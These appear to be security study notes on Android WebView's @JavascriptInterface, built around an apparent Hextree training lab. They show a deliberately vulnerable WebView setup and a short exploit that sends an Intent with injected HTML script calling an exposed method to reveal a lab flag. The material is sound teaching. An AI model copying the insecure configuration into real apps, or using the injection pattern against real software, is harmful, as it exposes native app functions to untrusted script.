---
description: A View that displays web pages.
---

# webview

## @JavascriptInterface

A Java function that contains the decorator `@JavascriptInterface` can be exposed into a webview. Vulnerable code:

```java
private void configureWebView() {
        WebSettings webSettings = this.webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setSafeBrowsingEnabled(false);
        this.webView.setWebChromeClient(new WebChromeClient());
        this.webView.setWebViewClient(new WebViewClient());
        this.webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
    }

    /* loaded from: classes3.dex */
    public class JavaScriptInterface {
        public JavaScriptInterface() {
        }

        @JavascriptInterface
        public void showToast(String message) {
            Toast.makeText(MainActivity.this, message, 0).show();
        }

        @JavascriptInterface
        public void showFlag() {
            Toast.makeText(MainActivity.this, "HXT{java-in-a-webview}", 0).show();
        }
    }
```

Example of exploitation:

```java
private void sendHtmlIntent() {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("io.hextree.webviewdemo", "io.hextree.webviewdemo.MainActivity"));
        intent.putExtra("htmlContent", "<html><body><script>Android.showFlag();</script></body></html>");
        startActivity(intent);
    }
```

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}

{% embed url="https://app.hextree.io/" %}
